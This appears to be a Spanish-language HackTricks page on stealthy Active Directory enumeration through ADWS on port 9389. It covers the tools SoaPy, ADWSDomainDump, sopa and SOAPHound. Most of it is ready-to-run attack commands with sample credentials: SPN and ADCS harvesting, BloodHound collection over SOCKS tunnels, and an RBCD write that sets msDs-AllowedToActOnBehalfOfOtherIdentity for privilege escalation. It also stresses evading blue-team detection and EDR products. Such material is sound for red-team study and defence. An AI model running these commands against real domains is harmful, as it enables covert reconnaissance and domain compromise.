# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## ¿Qué es ADWS?

Active Directory Web Services (ADWS) está **habilitado por defecto en todos los Domain Controllers desde Windows Server 2008 R2** y escucha en TCP **9389**. A pesar del nombre, **no hay HTTP involucrado**. En su lugar, el servicio expone datos al estilo LDAP a través de una pila de protocolos propietarios de encuadre .NET:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Debido a que el tráfico está encapsulado dentro de estos marcos binarios SOAP y viaja por un puerto poco común, **la enumeración a través de ADWS es mucho menos probable que sea inspeccionada, filtrada o detectada por firmas que el tráfico LDAP/389 & 636 clásico**. Para los operadores esto implica:

* Reconocimiento más sigiloso: los equipos Blue suelen concentrarse en consultas LDAP.
* Libertad para recolectar desde **hosts no Windows (Linux, macOS)** túnelizando 9389/TCP mediante un proxy SOCKS.
* Los mismos datos que obtendrías vía LDAP (usuarios, grupos, ACLs, esquema, etc.) y la capacidad de realizar **writes** (por ejemplo `msDs-AllowedToActOnBehalfOfOtherIdentity` para **RBCD**).

Las interacciones con ADWS se implementan sobre WS-Enumeration: cada consulta comienza con un mensaje `Enumerate` que define el filtro/atributos LDAP y devuelve un `EnumerationContext` GUID, seguido por uno o más mensajes `Pull` que transmiten hasta la ventana de resultados definida por el servidor. Los contextos expiran después de ~30 minutos, por lo que las herramientas deben paginar resultados o dividir filtros (consultas por prefijo en cada CN) para evitar perder estado. Al solicitar descriptores de seguridad, especifica el control `LDAP_SERVER_SD_FLAGS_OID` para omitir SACLs; de lo contrario ADWS simplemente excluye el atributo `nTSecurityDescriptor` de su respuesta SOAP.

> NOTA: ADWS también es usado por muchas herramientas RSAT GUI/PowerShell, por lo que el tráfico puede mezclarse con actividad administrativa legítima.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) es una **implementación completa del stack de protocolo ADWS en Python puro**. Construye los frames NBFX/NBFSE/NNS/NMF byte por byte, permitiendo la recolección desde sistemas tipo Unix sin tocar el runtime .NET.

### Key Features

* Soporta **proxying through SOCKS** (útil desde implants C2).
* Filtros de búsqueda de grano fino idénticos a LDAP `-q '(objectClass=user)'`.
* Operaciones opcionales de **write** ( `--set` / `--delete` ).
* Modo de salida **BOFHound** para ingestión directa en BloodHound.
* Flag `--parse` para embellecer timestamps / `userAccountControl` cuando se requiere legibilidad humana.

### Targeted collection flags & write operations

SoaPy incluye switches curados que replican las tareas de búsqueda LDAP más comunes sobre ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, además de knobs crudos `--query` / `--filter` para pulls personalizados. Combínalos con primitivas de escritura como `--rbcd <source>` (setea `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging para Kerberoasting dirigido) y `--asrep` (invierte `DONT_REQ_PREAUTH` en `userAccountControl`).

Ejemplo de búsqueda dirigida de SPN que solo devuelve `samAccountName` y `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Usa el mismo host/credenciales para aprovechar inmediatamente los hallazgos: volcar objetos con capacidad RBCD con `--rbcds`, luego aplica `--rbcd 'WEBSRV01$' --account 'FILE01$'` para montar una cadena Resource-Based Constrained Delegation (ver [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) para la ruta completa de abuso).

### Instalación (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump sobre ADWS (Linux/Windows)

* Fork de `ldapdomaindump` que intercambia consultas LDAP por llamadas ADWS en TCP/9389 para reducir los hits de LDAP-signature.
* Realiza una comprobación inicial de accesibilidad a 9389 a menos que se pase `--force` (salta la comprobación si port scans son ruidosos/filtrados).
* Probado contra Microsoft Defender for Endpoint y CrowdStrike Falcon con bypass exitoso en el README.

### Instalación
```bash
pipx install .
```
### Uso
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
La salida típica registra la comprobación de accesibilidad del puerto 9389, ADWS bind y el inicio/fin del dump:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Un cliente práctico para ADWS en Golang

De manera similar a soapy, [sopa](https://github.com/Macmod/sopa) implementa la pila de protocolos ADWS (MS-NNS + MC-NMF + SOAP) en Golang, exponiendo flags de línea de comandos para emitir llamadas ADWS como:

* **Búsqueda y recuperación de objetos** - `query` / `get`
* **Ciclo de vida del objeto** - `create [user|computer|group|ou|container|custom]` and `delete`
* **Edición de atributos** - `attr [add|replace|delete]`
* **Gestión de cuentas** - `set-password` / `change-password`
* y otros como `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

## SOAPHound – Recolección ADWS de alto volumen (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) es un collector .NET que mantiene todas las interacciones LDAP dentro de ADWS y emite JSON compatible con BloodHound v4. Construye una caché completa de `objectSid`, `objectGUID`, `distinguishedName` y `objectClass` una vez (`--buildcache`), luego la reutiliza para pases de alto volumen `--bhdump`, `--certdump` (ADCS), o `--dnsdump` (AD-integrated DNS) de modo que solo ~35 atributos críticos abandonen el DC. AutoSplit (`--autosplit --threshold <N>`) divide automáticamente las consultas por prefijo CN para mantenerse por debajo del tiempo de espera EnumerationContext de 30 minutos en bosques grandes.

Flujo de trabajo típico en una VM de operador unida al dominio:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Los JSON exportados se integran directamente en los flujos de trabajo de SharpHound/BloodHound—véase [BloodHound methodology](bloodhound.md) para ideas de graficado posteriores. AutoSplit hace que SOAPHound sea resistente en bosques con varios millones de objetos, manteniendo el recuento de consultas más bajo que las snapshots al estilo ADExplorer.

## Flujo sigiloso de recopilación AD

El siguiente flujo muestra cómo enumerar **objetos del dominio & ADCS** a través de ADWS, convertirlos a BloodHound JSON y buscar rutas de ataque basadas en certificados – todo desde Linux:

1. **Tunnel 9389/TCP** desde la red objetivo hasta tu máquina (p. ej. via Chisel, Meterpreter, SSH dynamic port-forward, etc.). Exporta `export HTTPS_PROXY=socks5://127.0.0.1:1080` o usa las opciones de SoaPy `--proxyHost/--proxyPort`.

2. **Recopila el objeto raíz del dominio:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Recolectar objetos relacionados con ADCS del NC de Configuración:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Convertir a BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Sube el ZIP** en la GUI de BloodHound y ejecuta consultas cypher como `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` para revelar rutas de escalamiento de certificados (ESC1, ESC8, etc.).

### Escribir `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Combina esto con `s4u2proxy`/`Rubeus /getticket` para una cadena completa de **Resource-Based Constrained Delegation** (see [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Resumen de herramientas

| Propósito | Herramienta | Notas |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Convierte registros de SoaPy/ldapsearch |
| Compromiso de certificados | [Certipy](https://github.com/ly4k/Certipy) | Se puede enrutarse a través del mismo SOCKS |
| ADWS enumeration & cambios de objetos | [sopa](https://github.com/Macmod/sopa) | Cliente genérico para interactuar con endpoints ADWS conocidos - permite la enumeración, creación de objetos, modificaciones de atributos y cambios de contraseñas |

## Referencias

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
